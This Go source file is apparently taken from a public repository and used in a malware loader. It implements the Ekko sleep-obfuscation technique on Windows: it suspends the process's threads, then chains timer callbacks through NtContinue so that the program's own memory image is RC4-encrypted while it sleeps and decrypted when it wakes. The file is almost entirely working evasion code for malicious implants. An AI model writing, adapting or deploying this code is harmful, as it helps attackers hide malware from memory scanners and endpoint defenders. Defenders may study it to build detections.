// taken from https://github.com/scriptchildie/goEkko
package ekko

import (
	"fmt"
	"time"
	"log"
	"syscall"
	"unsafe"
	"crypto/rand"
	"loader/pkg/types"
	"golang.org/x/sys/windows"
)
/*
it is very hard to get this rop chain working with my wincall infra, so leaving as is :# use at ur own risk
*/
const (
	WT_EXECUTEINTIMERTHREAD         = 0x00000020
	ThreadQuerySetWin32StartAddress = 0x9
)

var (
	// kernel32
	kernel32dll               = syscall.NewLazyDLL("kernel32.dll")
	procSuspendThread         = kernel32dll.NewProc("SuspendThread")
	procResumeThread          = kernel32dll.NewProc("ResumeThread")
	procGetModuleHandleA      = kernel32dll.NewProc("GetModuleHandleA")
	procCreateEventW          = kernel32dll.NewProc("CreateEventW")
	procCreateTimerQueue      = kernel32dll.NewProc("CreateTimerQueue")
	procCreateTimerQueueTimer = kernel32dll.NewProc("CreateTimerQueueTimer")
	procRtlCaptureContext     = kernel32dll.NewProc("RtlCaptureContext")
	procVirtualProtect        = kernel32dll.NewProc("VirtualProtect")
	procWaitForSingleObject   = kernel32dll.NewProc("WaitForSingleObject")
	procSetEvent              = kernel32dll.NewProc("SetEvent")
	procDeleteTimerQueue      = kernel32dll.NewProc("DeleteTimerQueue")

	//ntdll
	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
	procNtContinue               = ntdll.NewProc("NtContinue")
	procNtQueryInformationThread = ntdll.NewProc("NtQueryInformationThread")

	//Advapi32
	Advapi32dll           = syscall.NewLazyDLL("Advapi32.dll")
	procSystemFunction032 = Advapi32dll.NewProc("SystemFunction032")
)

func EkkoSleep(sleepTime uint64) error {

	currentProcessID := uint32(windows.GetCurrentProcessId())

	// Take a snapshot of all running threads in the system
	hThreadSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hThreadSnapshot)

	var te32 windows.ThreadEntry32
	te32.Size = uint32(unsafe.Sizeof(te32))

	// Retrieve information about the first thread in the snapshot
	err = windows.Thread32First(hThreadSnapshot, &te32)
	if err != nil {
		return err
	}

	for {
		if te32.OwnerProcessID == currentProcessID {

			if windows.GetCurrentThreadId() != te32.ThreadID {
				//fmt.Println(te32.ThreadID)

				hThread, err := windows.OpenThread(0xFFFF, false, te32.ThreadID)
				if err != nil {
					continue
				}
				defer windows.CloseHandle(hThread)
				var dwStartAddress, size uintptr
				procNtQueryInformationThread.Call(uintptr(hThread), ThreadQuerySetWin32StartAddress, uintptr(unsafe.Pointer(&dwStartAddress)), unsafe.Sizeof(dwStartAddress), uintptr(unsafe.Pointer(&size)))

				ImageBase, _, _ := procGetModuleHandleA.Call(uintptr(0))
				e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
				nt_header := (*types.IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))
				ImageEndAddress := ImageBase + uintptr(nt_header.OptionalHeader.SizeOfImage)

				if dwStartAddress >= ImageBase && dwStartAddress <= ImageEndAddress {
					procSuspendThread.Call(uintptr(hThread))
				} else {
					goto nextThread
				}

			}
		}

		// Retrieve information about the next thread in the snapshot
	nextThread:
		err = windows.Thread32Next(hThreadSnapshot, &te32)
		if err != nil {
			break // No more threads
		}
	}

	te32.Size = uint32(unsafe.Sizeof(te32))
	err = windows.Thread32First(hThreadSnapshot, &te32)
	if err != nil {
		return err
	}

	err = ekko(sleepTime)
	if err != nil {
		fmt.Printf("[ERROR] Ekko Sleep failed %v\n", err)
	}
	error2 := err

	// resume threads
	for {
		if te32.OwnerProcessID == currentProcessID {

			if windows.GetCurrentThreadId() != te32.ThreadID {
				//fmt.Println(te32.ThreadID)

				hThread, err := windows.OpenThread(0xFFFF, false, te32.ThreadID)
				if err != nil {
					continue
				}
				defer windows.CloseHandle(hThread)

				procResumeThread.Call(uintptr(hThread))

			}
		}

		// Retrieve information about the next thread in the snapshot
		err = windows.Thread32Next(hThreadSnapshot, &te32)
		if err != nil {
			break // No more threads
		}
	}

	if error2 != nil {
		return error2
	}
	return nil
}

func ekko(sleepTime uint64) error {

	var CtxThread types.CONTEXT
	var RopProtRW types.CONTEXT
	var RopMemEnc types.CONTEXT
	var RopDelay types.CONTEXT
	var RopMemDec types.CONTEXT
	var RopProtRX types.CONTEXT
	var RopSetEvt types.CONTEXT

	keybuf, _ := GenerateKey(16)

	var Key, Img types.UString

	ImageBase, _, _ := procGetModuleHandleA.Call(uintptr(0))
	e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
	nt_header := (*types.IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))

	hEvent, _, _ := procCreateEventW.Call(0, 0, 0, 0)
	var hNewTimer, hTimerQueue uintptr
	hTimerQueue, _, _ = procCreateTimerQueue.Call()
	Img.Buffer = (*byte)(unsafe.Pointer(ImageBase))
	Img.Length = nt_header.OptionalHeader.SizeOfImage

	Key.Buffer = &keybuf[0]
	Key.Length = uint32(unsafe.Sizeof(Key))

	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procRtlCaptureContext.Addr(), uintptr(unsafe.Pointer(&CtxThread)), 0, 0, WT_EXECUTEINTIMERTHREAD)
	windows.WaitForSingleObject(windows.Handle(hEvent), 0x100)
	//fmt.Println(CtxThread)

	if CtxThread.Rip == 0 {
		log.Fatalln()
	}
	RopProtRW = CtxThread
	RopMemEnc = CtxThread
	RopDelay = CtxThread
	RopMemDec = CtxThread
	RopProtRX = CtxThread
	RopSetEvt = CtxThread

	var OldProtect uint64
	RopProtRW.Rsp -= 8
	RopProtRW.Rip = uint64(procVirtualProtect.Addr())
	RopProtRW.Rcx = uint64(ImageBase)
	RopProtRW.Rdx = uint64(nt_header.OptionalHeader.SizeOfImage)
	RopProtRW.R8 = windows.PAGE_READWRITE
	RopProtRW.R9 = uint64(uintptr(unsafe.Pointer(&OldProtect)))
	//fmt.Printf("\n[DEBUG] VirtualProtect: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopProtRW.Rip, RopProtRW.Rcx, RopProtRW.Rdx, RopProtRW.R8, RopProtRW.R9)

	RopMemEnc.Rsp -= 8
	RopMemEnc.Rip = uint64(procSystemFunction032.Addr())
	RopMemEnc.Rcx = uint64(uintptr(unsafe.Pointer(&Img)))
	RopMemEnc.Rdx = uint64(uintptr(unsafe.Pointer(&Key)))
	//fmt.Printf("\n[DEBUG] SystemFunction032: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopMemEnc.Rip, RopMemEnc.Rcx, RopMemEnc.Rdx, 0, 0)

	RopDelay.Rsp -= 8
	RopDelay.Rip = uint64(procWaitForSingleObject.Addr())
	RopDelay.Rcx = uint64(windows.CurrentProcess())
	RopDelay.Rdx = sleepTime
	//fmt.Printf("\n[DEBUG] WaitForSingleObject: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopDelay.Rip, RopDelay.Rcx, RopDelay.Rdx, 0, 0)

	RopMemDec.Rsp -= 8
	RopMemDec.Rip = uint64(procSystemFunction032.Addr())
	RopMemDec.Rcx = uint64(uintptr(unsafe.Pointer(&Img)))
	RopMemDec.Rdx = uint64(uintptr(unsafe.Pointer(&Key)))
	//fmt.Printf("\n[DEBUG] SystemFunction032: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopMemDec.Rip, RopMemDec.Rcx, RopMemDec.Rdx, 0, 0)

	RopProtRX.Rsp -= 8
	RopProtRX.Rip = uint64(procVirtualProtect.Addr())
	RopProtRX.Rcx = uint64(ImageBase)
	RopProtRX.Rdx = uint64(nt_header.OptionalHeader.SizeOfImage)
	RopProtRX.R8 = windows.PAGE_EXECUTE_READWRITE
	RopProtRX.R9 = uint64(uintptr(unsafe.Pointer(&OldProtect)))
	//fmt.Printf("\n[DEBUG] VirtualProtect: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopProtRX.Rip, RopProtRX.Rcx, RopProtRX.Rdx, RopProtRX.R8, RopProtRX.R9)

	// SetEvent( hEvent );
	RopSetEvt.Rsp -= 8
	RopSetEvt.Rip = uint64(procSetEvent.Addr())
	RopSetEvt.Rcx = uint64(hEvent)

	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopProtRW)), 100, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopMemEnc)), 200, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopDelay)), 300, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopMemDec)), 400, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopProtRX)), 500, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopSetEvt)), 600, 0, WT_EXECUTEINTIMERTHREAD)

	windows.WaitForSingleObject(windows.Handle(hEvent), windows.INFINITE)
	procDeleteTimerQueue.Call(hTimerQueue)

	return nil
}

// EncryptMemoryRegion encrypts a memory region using SystemFunction032 (RC4)
// This is a standalone function that can be called independently
func EncryptMemoryRegion(baseAddr uintptr, size uint32, key []byte, sleepTime uint64) error {
	if len(key) == 0 {
		return fmt.Errorf("key cannot be empty")
	}
	
	var dataUString, keyUString types.UString
	

	dataUString.Buffer = (*byte)(unsafe.Pointer(baseAddr))
	dataUString.Length = size
	dataUString.MaximumLength = size
	

	keyUString.Buffer = &key[0]
	keyUString.Length = uint32(len(key))
	keyUString.MaximumLength = uint32(len(key))

	ret, _, _ := procSystemFunction032.Call(
		uintptr(unsafe.Pointer(&dataUString)),
		uintptr(unsafe.Pointer(&keyUString)),
	)

	time.Sleep(time.Duration(sleepTime) * time.Millisecond)
	
	if ret != 0 {
		return fmt.Errorf("SystemFunction032 failed with status: 0x%X", ret)
	}
	
	return nil
}

func GenerateKey(keySize int) ([]byte, error) {
	key := make([]byte, keySize)
	_, err := rand.Read(key)
	if err != nil {
		return nil, fmt.Errorf("failed to generate random key: %w", err)
	}
	return key, nil
}